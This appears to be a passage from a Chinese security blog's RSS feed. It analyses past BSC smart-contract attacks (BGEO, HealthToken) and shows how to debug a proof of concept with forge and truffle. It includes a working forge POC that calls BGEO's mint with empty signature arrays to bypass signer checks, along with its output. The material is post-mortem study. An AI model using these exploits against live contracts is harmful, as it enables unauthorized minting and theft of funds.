[9.999e34])&#xA;    │   │   └─ ← 0x0000000000000000000000000000000000000000000000000000000000000001&#xA;    │   ├─ [519] BEGO::balanceOf(POC: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]&#xA;    │   │   └─ ← 0x000000000000000000000000000000000013426172c74d821da6d934589c0000&#xA;    │   └─ ← 99999999999999999000000000000000000 [9.999e34]&#xA;    ├─ emit log_named_decimal_uint(key: balance i have, val: 99999999999999999000000000000000000 [9.999e34], decimals: 18)&#xA;    └─ ← ()&#xA;&#xA;Test result: ok. 1 passed; 0 failed; finished in 24.17ms&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;truffle-test&#34;&gt;&lt;span&gt;truffle test&lt;/span&gt;&#xA;  &lt;a href=&#34;#truffle-test&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;在test文件夹中创建truffle测试文件&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;truffle create test POC&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;const POC = artifacts.require(&amp;#34;POC&amp;#34;);&#xA;&#xA;&#xA;contract(&amp;#34;POC&amp;#34;, function (accounts) {&#xA;  console.log(&amp;#34;Running test cases...&amp;#34;);&#xA;&#xA;  it(&amp;#34;hack test&amp;#34;, async function () {&#xA;    let instance = await POC.deployed();&#xA;    let tx = await instance.hack();&#xA;    console.log(tx)&#xA;    assert(tx !== null, &amp;#34;Transaction should not be null&amp;#34;);&#xA;&#xA;  });&#xA;&#xA;});&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;运行测试：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;truffle test&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;请确保合约已经部署，这和forge不一样&#xA;&#xA;truffle test&#xA;Using network &amp;#39;development&amp;#39;.&#xA;&#xA;&#xA;Compiling your contracts...&#xA;===========================&#xA;&amp;gt; Everything is up to date, there is nothing to compile.&#xA;Running test cases...&#xA;&#xA;&#xA;  Contract: POC&#xA;{&#xA;  tx: &amp;#39;0xd15318c7770ee6cbe4a7c4943b2581987e37e6bc8cd27189fb079742c2de2509&amp;#39;,&#xA;  receipt: {&#xA;    transactionHash: &amp;#39;0xd15318c7770ee6cbe4a7c4943b2581987e37e6bc8cd27189fb079742c2de2509&amp;#39;,&#xA;    transactionIndex: 0,&#xA;    blockNumber: 22315730,&#xA;    blockHash: &amp;#39;0xf4fe2a264157abce7b43f2a98ea5bdc02190526c88caeee6f6ad2299057ed107&amp;#39;,&#xA;    from: &amp;#39;0x712517a5895fcd531e77a98f67b4517ed86baa4a&amp;#39;,&#xA;    to: &amp;#39;0x4f471b5ce39210b343800c94e8fcdcb97bee1db4&amp;#39;,&#xA;    cumulativeGasUsed: 85959,&#xA;    gasUsed: 85959,&#xA;    contractAddress: null,&#xA;    logs: [],&#xA;    logsBloom: &amp;#39;0x00000000000000000000001000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000020000000000000000000800000080000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000020000000000000000002000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000001000000000000080000000&amp;#39;,&#xA;    status: true,&#xA;    effectiveGasPrice: 2501568968,&#xA;    type: &amp;#39;0x2&amp;#39;,&#xA;    rawLogs: [ [Object] ]&#xA;  },&#xA;  logs: []&#xA;}&#xA;    ✔ hack test (3469ms)&#xA;&#xA;&#xA;  1 passing (4s)&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;调试&#34;&gt;&lt;span&gt;调试&lt;/span&gt;&#xA;  &lt;a href=&#34;#%e8%b0%83%e8%af%95&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;相比于forge test 中的用log进行打印来调试， truffle的debug功能就太强大了&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;调试tx&#34;&gt;&lt;span&gt;调试tx&lt;/span&gt;&#xA;  &lt;a href=&#34;#%e8%b0%83%e8%af%95tx&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;truffle debug 0xd15318c7770ee6cbe4a7c4943b2581987e37e6bc8cd27189fb079742c2de2509  -x&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;注意最后的 &lt;code&gt;-x&lt;/code&gt;选项 ，由于我们的代码引用了在bsc链上已经verfied的合约 &lt;code&gt;IBGEO20 constant BGEO = IBGEO20(0xc342774492b54ce5F8ac662113ED702Fc1b34972) &lt;/code&gt;  那么  &lt;code&gt;-x&lt;/code&gt;选项 会去下载 改合约的代码以便调试了可以step into其代码&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;debug(development:0xd15318c7...)&amp;gt; l&#xA;&#xA;BGeoToken.sol:&#xA;&#xA;1241:     function checkSignParams(&#xA;1242:         bytes32[] memory _r,&#xA;1243:         bytes32[] memory _s,&#xA;1244:         uint8[] memory _v&#xA;1245:     ) private view returns (bool){&#xA;1246:         return (_r.length == _s.length) &amp;amp;&amp;amp; (_s.length == _v.length);&#xA;                      ^^^^^^^^^&#xA;1247:     }&#xA;1248:&#xA;1249:&#xA;&#xA;debug(development:0xd15318c7...)&amp;gt; v&#xA;&#xA;Solidity built-ins:&#xA;    msg: {&#xA;           data: hex&amp;#39;32a09b10000000000000000000000000000000000013426172c74d821da6d934589c000000000000000000000000000000000000000000000000000000000000000000c00000000000000000000000004f471b5ce39210b343800c94e8fcdcb97bee1db40000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000012000000000000000000000000000000000000000000000000000000000000001400000000000000000000000000000000000000000000000000000000000000020a662d2138624b3cefaa2ca8e4846882068dbbaa7dcd89541471754d2c50bb657000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&amp;#39;,&#xA;           sig: 0x32a09b10,&#xA;           sender: 0x4f471B5CE39210b343800c94e8fCDcB97bEe1DB4,&#xA;           value: 0&#xA;         }&#xA;     tx: {&#xA;           origin: 0x712517A5895fCD531E77A98F67b4517ED86BaA4a,&#xA;           gasprice: 2501568968&#xA;         }&#xA;  block: {&#xA;           coinbase: 0x0000000000000000000000000000000000000000,&#xA;           difficulty: 6137103538401385071974411046224224370499740472585752841626323261317793736621,&#xA;           gaslimit: 30000000,&#xA;           number: 22315730,&#xA;           timestamp: 1686295389&#xA;         }&#xA;   this: 0xc342774492b54ce5F8ac662113ED702Fc1b34972 (BGeoToken)&#xA;    now: 1686295389&#xA;&#xA;Contract variables:&#xA;   signers: {&#xA;              _inner: {&#xA;                _values: ?,&#xA;                _indexes: Map(0) {}&#xA;              }&#xA;            }&#xA;       bsc: 0&#xA;  txHashes: Map(0) {}&#xA;&#xA;Local variables:&#xA;  _r: []&#xA;  _s: []&#xA;  _v: []&#xA;&#xA;Note: Some storage variables could not be fully decoded; the debugger can only see storage it has seen touched during the transaction.&#xA;debug(development:0xd15318c7...)&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;在test-case中加入调试&#34;&gt;&lt;span&gt;在test case中加入调试&lt;/span&gt;&#xA;  &lt;a href=&#34;#%e5%9c%a8test-case%e4%b8%ad%e5%8a%a0%e5%85%a5%e8%b0%83%e8%af%95&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;在需要调试的语句上加上&lt;code&gt;debug()&lt;/code&gt; 包装， 并且在truffle test 中加入&lt;code&gt;--debug&lt;/code&gt;选项，就可以在改语句上执行调试&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;const POC = artifacts.require(&amp;#34;POC&amp;#34;);&#xA;&#xA;&#xA;contract(&amp;#34;POC&amp;#34;, function (accounts) {&#xA;  console.log(&amp;#34;Running test cases...&amp;#34;);&#xA;&#xA;  it(&amp;#34;hack test&amp;#34;, async function () {&#xA;    let instance = await POC.deployed();&#xA;    let tx = await debug(instance.hack()); // here, add debug(xxxx)&#xA;    console.log(tx)&#xA;    assert(tx !== null, &amp;#34;Transaction should not be null&amp;#34;);&#xA;&#xA;  });&#xA;});&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;truffle test --debug&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;注：truffle test &amp;ndash;debug 没有  &lt;code&gt;-x&lt;/code&gt;选项&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;调试合约的只读方法&#34;&gt;&lt;span&gt;调试合约的只读方法&lt;/span&gt;&#xA;  &lt;a href=&#34;#%e8%b0%83%e8%af%95%e5%90%88%e7%ba%a6%e7%9a%84%e5%8f%aa%e8%af%bb%e6%96%b9%e6%b3%95&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;a href=&#34;https://trufflesuite.com/docs/truffle/how-to/debug-test/use-the-truffle-debugger/#debugging-read-only-calls&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://trufflesuite.com/docs/truffle/how-to/debug-test/use-the-truffle-debugger/#debugging-read-only-calls&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>Binance BGEO Attack Analysis</title>
      <link>https://yinhui1984.github.io/binance-bgeo-attack-analysis/</link>
      <pubDate>Fri, 28 Apr 2023 08:43:45 +0800</pubDate>
      <guid>https://yinhui1984.github.io/binance-bgeo-attack-analysis/</guid>
      <category domain="https://yinhui1984.github.io/categories/security/">Security</category>
      <description>&lt;p&gt;参数检查不严格的锅&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;漏洞分析&#34;&gt;&lt;span&gt;漏洞分析&lt;/span&gt;&#xA;  &lt;a href=&#34;#%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;攻击发生在https://bscscan.com/tx/0x9f4ef3cc55b016ea6b867807a09f80d1b2e36f6cd6fccfaf0182f46060332c57&lt;/p&gt;&#xA;&lt;p&gt;被攻击合约: &lt;a href=&#34;https://bscscan.com/address/0xc342774492b54ce5F8ac662113ED702Fc1b34972#code&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;0xc342774492b54ce5F8ac662113ED702Fc1b34972&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;合约的&lt;code&gt;mint&lt;/code&gt;定义如下:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;    function mint(&#xA;        uint256 _amount,&#xA;        string memory _txHash,&#xA;        address _receiver,&#xA;        bytes32[] memory _r,&#xA;        bytes32[] memory _s,&#xA;        uint8[] memory _v&#xA;    ) external isSigned(_txHash, _amount, _r, _s, _v) returns (bool) {&#xA;        require(!txHashes[_txHash], &amp;#34;tx-hash-used&amp;#34;);&#xA;        txHashes[_txHash] = true;&#xA;&#xA;        _mint(_receiver, _amount);&#xA;        return true;&#xA;    }&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;其中的&lt;code&gt;_mint()&lt;/code&gt;如下:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;    function _mint(address account, uint256 amount) internal {&#xA;        require(account != address(0), &amp;#34;BEP20: mint to the zero address&amp;#34;);&#xA;&#xA;        _totalSupply = _totalSupply.add(amount);&#xA;        _balances[account] = _balances[account].add(amount);&#xA;        emit Transfer(address(0), account, amount);&#xA;    }&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;在&lt;code&gt;mint()&lt;/code&gt;函数执行了2个检查, 通过检查便可调用&lt;code&gt;_mint()&lt;/code&gt;增加msg.sender的余额&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;检查1:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;require(!txHashes[_txHash], &amp;#34;tx-hash-used&amp;#34;);&#xA;        txHashes[_txHash] = true;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;检查传入的_txHash是否被使用过, 避免同一个__txHash被使用多次.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;检查2:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;isSigned(_txHash, _amount, _r, _s, _v)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这是一个modifier, 用于检查 _txHash和_amout传入参数是否被正确签名:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;    modifier isSigned(&#xA;        string memory _txHash,&#xA;        uint256 _amount,&#xA;        bytes32[] memory _r,&#xA;        bytes32[] memory _s,&#xA;        uint8[] memory _v&#xA;    ) {&#xA;        require(checkSignParams(_r, _s, _v), &amp;#34;bad-sign-params&amp;#34;);&#xA;        bytes32 _hash = keccak256(&#xA;            abi.encodePacked(bsc, msg.sender, _txHash, _amount)&#xA;        );&#xA;        address[] memory _signers = new address[](_r.length);&#xA;        for (uint8 i = 0; i &amp;lt; _r.length; i&amp;#43;&amp;#43;) {&#xA;            _signers[i] = ecrecover(_hash, _v[i], _r[i], _s[i]);&#xA;        }&#xA;&#xA;        require(isSigners(_signers), &amp;#34;bad-signers&amp;#34;);&#xA;        _;&#xA;    }&#xA;&#xA;   function isSigners(address[] memory _signers) public view returns (bool) {&#xA;        for (uint8 i = 0; i &amp;lt; _signers.length; i&amp;#43;&amp;#43;) {&#xA;            if (!_containsSigner(_signers[i])) {&#xA;                return false;&#xA;            }&#xA;        }&#xA;        return true;&#xA;    }&#xA;    function checkSignParams(&#xA;        bytes32[] memory _r,&#xA;        bytes32[] memory _s,&#xA;        uint8[] memory _v&#xA;    ) private view returns (bool) {&#xA;        return (_r.length == _s.length) &amp;amp;&amp;amp; (_s.length == _v.length);&#xA;    }&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;从上面的代码可以看出, 验证签名的逻辑如下:&#xA;对于参数_txHash和_amount, 有一组椭圆曲线签名对应的(r, s, v), 通过&lt;code&gt;ecrecover&lt;/code&gt;函数恢复出签名者的公钥(地址), 并检查签名地址是否包含在预定于的合法签名者列表中(可以理解为白名单)&lt;/p&gt;&#xA;&lt;p&gt;可以将代码简化为:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;def isSigned(message, r[],s[],v[]){&#xA;&#x9;&#x9;allSigners = recovery_signer_addresses_from_r_s_v_array();&#xA;&#x9;&#x9;for (s in allSigners){&#xA;&#x9;&#x9;&#x9;if (s not in whiteList){&#xA;&#x9;&#x9;&#x9;&#x9;return false;&#xA;&#x9;&#x9;&#x9;}&#xA;&#x9;&#x9;}&#xA;&#x9;&#x9;return true&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这里有两个问题需要注意: 一是默认返回不应该为true, 而应该默认返回false.  二是没有注意数组可能为空, 但数组长度为0时, 代码直接返回true了, 这就绕过了&lt;code&gt;isSigned&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;   function isSigners(address[] memory _signers) public view returns (bool) {&#xA;        // 问题出在这里： 传入的数组为空时，长度为0， 直接返回true了&#xA;        for (uint8 i = 0; i &amp;lt; _signers.length; i&amp;#43;&amp;#43;) {&#xA;            if (!_containsSigner(_signers[i])) {&#xA;                return false;&#xA;            }&#xA;        }&#xA;        return true;&#xA;    }&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;poc&#34;&gt;&lt;span&gt;POC&lt;/span&gt;&#xA;  &lt;a href=&#34;#poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;// SPDX-License-Identifier: SEE LICENSE IN LICENSE&#xA;pragma solidity ^0.8.10;&#xA;&#xA;import &amp;#34;forge-std/Test.sol&amp;#34;;&#xA;&#xA;interface IBGEO20 {&#xA;    function balanceOf(address account) external view returns (uint256);&#xA;&#xA;    function decimals() external view returns (uint8);&#xA;&#xA;    function mint(&#xA;        uint256 _amount,&#xA;        string memory _txHash,&#xA;        address _receiver,&#xA;        bytes32[] memory _r,&#xA;        bytes32[] memory _s,&#xA;        uint8[] memory _v&#xA;    ) external returns (bool);&#xA;}&#xA;&#xA;&#xA;IBGEO20 constant BGEO = IBGEO20(0xc342774492b54ce5F8ac662113ED702Fc1b34972);&#xA;&#xA;contract Hack is Test {&#xA;    function setUp() public {&#xA;        vm.createSelectFork(&amp;#34;theNet&amp;#34;, 22315679); //BSC&#xA;    }&#xA;&#xA;    function testPoc() public {&#xA;        BGEO.mint(&#xA;            99999999999999999 * 10 ** 18,&#xA;            &amp;#34;abcdefg&amp;#34;,&#xA;            address(this),&#xA;            new bytes32[](0),&#xA;            new bytes32[](0),&#xA;            new uint8[](0)&#xA;        );&#xA;&#xA;        emit log_named_decimal_uint(&#xA;            &amp;#34;BGEO i have&amp;#34;,&#xA;            BGEO.balanceOf(address(this)),&#xA;            BGEO.decimals()&#xA;        );&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;输出:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;[PASS] testPoc() (gas: 64559)&#xA;Logs:&#xA;  BGEO i have: 99999999999999999.000000000000000000&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;​&lt;/p&gt;</description>
    </item>
    <item>
      <title>HealthToken 攻击案例分析</title>
      <link>https://yinhui1984.github.io/healthtoken-attack-analysic/</link>
      <pubDate>Thu, 27 Apr 2023 13:08:06 +0800</pubDate>
      <guid>https://yinhui1984.github.io/healthtoken-attack-analysic/</guid>
      <category domain="https://yinhui1984.github.io/categories/security/">Security</category>
      <description>&lt;p&gt;HEALTH Token 攻击案例分析&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;漏洞分析&#34;&gt;&lt;span&gt;漏洞分析&lt;/span&gt;&#xA;  &lt;a href=&#34;#%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;攻击 tx: &lt;a href=&#34;https://bscscan.com/tx/0xae8ca9dc8258ae32899fe641985739c3fa53ab1f603973ac74b424e165c66ccf&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://bscscan.com/tx/0xae8ca9dc8258ae32899fe641985739c3fa53ab1f603973ac74b424e165c66ccf&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;被攻击合约: &lt;a href=&#34;https://bscscan.com/address/0x32B166e082993Af6598a89397E82e123ca44e74E&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;0x32B166e082993Af6598a89397E82e123ca44e74E&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;合约中的&lt;code&gt;_transfer&lt;/code&gt;函数如下:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;    function _transfer(address from, address to, uint256 value) private {&#xA;        require(value &amp;lt;= _balances[from]);&#xA;        require(to != address(0));&#xA;        &#xA;        uint256 contractTokenBalance = balanceOf(address(this));&#xA;&#xA;        bool overMinTokenBalance = contractTokenBalance &amp;gt;= numTokensSellToAddToLiquidity;&#xA;        if (&#xA;            overMinTokenBalance &amp;amp;&amp;amp;&#xA;            !inSwapAndLiquify &amp;amp;&amp;amp;&#xA;            to == uniswapV2Pair &amp;amp;&amp;amp;&#xA;            swapAndLiquifyEnabled&#xA;        ) {&#xA;            contractTokenBalance = numTokensSellToAddToLiquidity;&#xA;            //add liquidity&#xA;            swapAndLiquify(contractTokenBalance);&#xA;        }&#xA;        if (block.timestamp &amp;gt;= pairStartTime.add(jgTime) &amp;amp;&amp;amp; pairStartTime != 0) {&#xA;            if (from != uniswapV2Pair) {&#xA;                uint256 burnValue = _balances[uniswapV2Pair].mul(burnFee).div(1000);&#xA;                _balances[uniswapV2Pair] = _balances[uniswapV2Pair].sub(burnValue);&#xA;                _balances[_burnAddress] = _balances[_burnAddress].add(burnValue);&#xA;                if (block.timestamp &amp;gt;= pairStartTime.add(jgTime)) {&#xA;                    pairStartTime &amp;#43;= jgTime;&#xA;                }&#xA;                emit Transfer(uniswapV2Pair,_burnAddress, burnValue);&#xA;                IPancakePair(uniswapV2Pair).sync();&#xA;            